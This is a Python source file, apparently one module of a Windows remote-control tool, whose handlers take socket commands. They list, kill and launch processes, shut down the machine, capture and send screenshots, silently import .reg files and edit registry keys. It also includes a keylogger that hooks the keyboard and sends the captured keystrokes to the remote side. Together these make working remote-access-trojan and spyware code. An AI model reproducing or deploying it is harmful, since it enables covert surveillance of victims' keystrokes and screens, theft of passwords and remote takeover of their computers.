import logging
import os
import sys
import socket
import winreg
import subprocess
from PIL import Image, ImageGrab
import io
from pynput import keyboard
import threading
import signal
import psutil

import ctypes
import win32gui
EnumWindows = ctypes.windll.user32.EnumWindows
EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
GetWindowText = ctypes.windll.user32.GetWindowTextW
GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
IsWindowVisible = ctypes.windll.user32.IsWindowVisible
GetWindowThreadProcessId = ctypes.windll.user32.GetWindowThreadProcessId


class ProcessRunning:
    def __init__(self, _sock, message):
        self._sock = _sock
        self.opcode = message[:5]
        self.message = message[5:]
        logging.debug('receive {} {}'.format(self.opcode, self.message))

    def do_task(self):
        if self.opcode == 'get__':
            self.send_process_list()
        if self.opcode == 'kill_':
            self.kill_proc_tree(pid=int(self.message))
        if self.opcode == 'start':
            self.startprocess(self.message)

    def send_process_list(self):
        for proc in psutil.process_iter():
            try:
                # Get process name & pid from process object.
                processName = proc.name()
                processID = proc.pid
                message = processName + ',' + str(processID) + '|'
                self._sock.sendall(message.encode('utf-8'))
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        self._sock.sendall('done'.encode('utf-8'))

    def kill_proc_tree(self, pid, sig=signal.SIGTERM, include_parent=True,
                       timeout=None, on_terminate=None):
        parent = psutil.Process(pid)
        children = parent.children(recursive=True)
        if include_parent:
            children.append(parent)
        for p in children:
            p.send_signal(sig)
        gone, alive = psutil.wait_procs(children, timeout=timeout,
                                        callback=on_terminate)
        return (gone, alive)

    def startprocess(self, process):
        psutil.Popen(str(process))


class AppRunning:
    def __init__(self, _sock, message):
        self._sock = _sock
        self.opcode = message[:5]
        self.message = message[5:]
        logging.debug('receive {} {}'.format(self.opcode, self.message))
        self.list_app_data = []

    def do_task(self):
        if self.opcode == 'get__':
            self.send_process_list()
        if self.opcode == 'kill_':
            self.kill_proc_tree(pid=int(self.message))
        if self.opcode == 'start':
            self.startprocess(self.message)

    def foreach_window(self, hwnd, lParam):
        if IsWindowVisible(hwnd):
            length = GetWindowTextLength(hwnd)
            if (length > 0):
                name = ctypes.create_unicode_buffer(length + 1)
                GetWindowText(hwnd, name, length + 1)

                pid = ctypes.c_ulong()
                result = ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
                process_id = pid.value

                self.list_app_data.append([name.value, pid.value])
        return True

    def send_process_list(self):
        EnumWindows(EnumWindowsProc(self.foreach_window), 0)
        for proc in self.list_app_data:
            try:
                # Get process name & pid from process object.
                processName = proc[0]
                processID = proc[1]
                message = processName + ',' + str(processID) + '|'
                self._sock.sendall(message.encode('utf-8'))
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        self._sock.sendall('done'.encode('utf-8'))


class ShutDown:
    '''
    Class which design and handle message for shutdown
        '''

    def __init__(self, _sock, timeout):
        self.timeout = timeout

    def do_task(self):
        platform = self.get_platform()
        if platform == 'Linux':
            # we cant shutdown a remotely linux machine without root access
            logging.debug('Linux platform')
            pass
        elif platform == 'OS X':
            # the same thing to OS X machine
            logging.debug('OSX platform')
            pass
        elif platform == 'Windows':
            # self.command = 'Shutdown.exe -s -t ' + str(self.timeout)
            subprocess.Popen(['Shutdown.exe', '-s', '-t', self.timeout])
            logging.debug('Window platform')
            return '00'  # Successful

    def get_platform(self):
        platforms = {
            'linux1': 'Linux',
            'linux2': 'Linux',
            'darwin': 'OS X',
            'win32': 'Windows'
        }
        if sys.platform not in platforms:
            return sys.platform
        return platforms[sys.platform]


class Screenshot:
    def __init__(self, _sock, opcode):
        self.opcode = opcode
        self.sock = _sock

    def do_task(self):
        if self.opcode == 'exit':
            return '01'  # stop code
        elif self.opcode == 'take':
            img = ImageGrab.grab()

            img_in_memory = io.BytesIO()
            img.save(img_in_memory, format='PNG')

            message = img_in_memory.getvalue()
            self.sock.sendall(message)
            self.sock.sendall(b'done')
            return '00'  # Successful


key_str = []


class Keystroke:
    def __init__(self, sock, opcode):
        self.sock = sock
        self.opcode = opcode

    def on_press(self, key):
        try:
            key_str.append(key.char)
        except AttributeError:
            if key == keyboard.Key.home:
                pass
            elif key == keyboard.Key.shift:
                key_str.append('')
            elif key == keyboard.Key.ctrl:
                key_str.append('')
            elif key == keyboard.Key.alt:
                key_str.append('')
            elif key == keyboard.Key.alt_gr:
                key_str.append('')
            elif key == keyboard.Key.esc:
                key_str.append('')
            elif key == keyboard.Key.tab:
                key_str.append('\t')
            elif key == keyboard.Key.enter:
                key_str.append('\n')
            elif key == keyboard.Key.backspace:
                key_str.append('BACKSPACE')
            elif key == keyboard.Key.delete:
                key_str.append('DELETE')
            else:
                key_str.append(key)

    def on_release(self, key):
        if key == keyboard.Key.home:
            return False

    def do_task(self):
        listener = listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release)

        if self.opcode == 'hook':
            listener.start()

        elif self.opcode == 'unhook':
            stop = keyboard.Controller()
            stop.press(keyboard.Key.home)
            stop.release(keyboard.Key.home)

        elif self.opcode == 'show':
            if key_str:
                data = ''.join(key_str)
                self.sock.sendall(data.encode('utf8'))
                print(data)
            else:
                exit_code = '05forced_exit'
                self.sock.sendall(exit_code.encode('utf8'))


class RegistryEdit:
    def __init__(self, sock, opcode):
        self.sock = sock
        self.opcode = opcode

    def base_registry(self, link):
        a = None
        if (link.index('\\') >= 0):
            base_str = link[:link.index('\\')]
            if base_str == 'HKEY_CLASSES_ROOT':
                a = winreg.HKEY_CLASSES_ROOT
            elif base_str == 'HKEY_CURRENT_USER':
                a = winreg.HKEY_CURRENT_USER
            elif base_str == 'HKEY_LOCAL_MACHINE':
                a = winreg.HKEY_LOCAL_MACHINE
            elif base_str == 'HKEY_USERS':
                a = winreg.HKEY_USERS
            elif base_str == 'HKEY_CURRENT_CONFIG':
                a = winreg.HKEY_CURRENT_CONFIG
        return a

    def get_value(self, a, link2, valueName):
        try:
            a = winreg.OpenKey(a, link2)
        except:
            return 'Error'
        data = winreg.QueryValueEx(a, valueName)[0]
        return str(data)

    def set_value(self, a, link2, valueName, value, valueType):
        try:
            a = winreg.OpenKey(a, link2, 0, winreg.KEY_SET_VALUE)
        except:
            return 'Error'
        type = None
        if valueType == 'String':
            type = winreg.REG_SZ
        elif valueType == 'Binary':
            type = winreg.REG_BINARY
            value = value.encode('utf8')
        elif valueType == 'DWORD':
            type = winreg.REG_DWORD
            value = int(value)
        elif valueType == 'QWORD':
            type = winreg.REG_QWORD
            value = int(value)
        elif valueType == 'Multi-String':
            type = winreg.REG_MULTI_SZ
        elif valueType == 'Expandable String':
            type = winreg.REG_EXPAND_SZ
        else:
            return 'Error'
        try:
            winreg.SetValueEx(a, valueName, 0, type, value)
        except:
            return 'Error'
        return 'Value set successfully'

    def delete_value(self, a, link2, valueName):
        try:
            a = winreg.OpenKey(a, link2, 0, winreg.KEY_SET_VALUE)
        except:
            return 'Error'

        try:
            winreg.DeleteValue(a, valueName)
        except:
            return 'Error'
        else:
            return 'Value deleted successfully'

    def delete_key(self, a, link2):
        try:
            winreg.DeleteKey(a, link2)
        except:
            return 'Error'
        else:
            return 'Key deleted successfully'

    def do_task(self):
        if self.opcode == 'exit':
            return '01'  # exit

        elif self.opcode[:4] == 'regf':  # open a registry file
            fin = open(sys.path[0] + '\\fileReg.reg', 'w')
            fin.write(self.opcode[5:])
            fin.close()
            s = sys.path[0] + '\\fileReg.reg'
            print(s)
            isSuccess = False
            try:
                subprocess.run('regedit.exe /s \"' + s + '\"', timeout=20)
                isSuccess = True
            except:
                isSuccess = False
            if isSuccess:
                s = 'Registry key successfully created'
                print(s)
                return '00'  # Successful
            else:
                s = 'Failed to create registry key'
                print(s)
                return '02'  # Failed

        elif self.opcode[:4] == 'send':  # send multiple registry data
            s = self.opcode[5:]
            print(s)
            option, link, valueName, value, valueType = s.split('~')

            a = self.base_registry(link)

            link2 = link[(link.index('\\') + 1):]

            if a == None:
                s = 'Error'
            else:
                if option == 'Create key':
                    try:
                        key = winreg.CreateKey(a, link2)
                        s = 'Key successfully created'
                    except:
                        s = 'Cannot create key'
                elif option == 'Delete key':
                    s = self.delete_key(a, link2)
                elif option == 'Get value':
                    s = self.get_value(a, link2, valueName)
                elif option == 'Set value':
                    s = self.set_value(a, link2, valueName, value, valueType)
                elif option == 'Delete value':
                    s = self.delete_value(a, link2, valueName)
                else:
                    s = 'Error'

            print(s)
            self.sock.send(s.encode('utf8'))
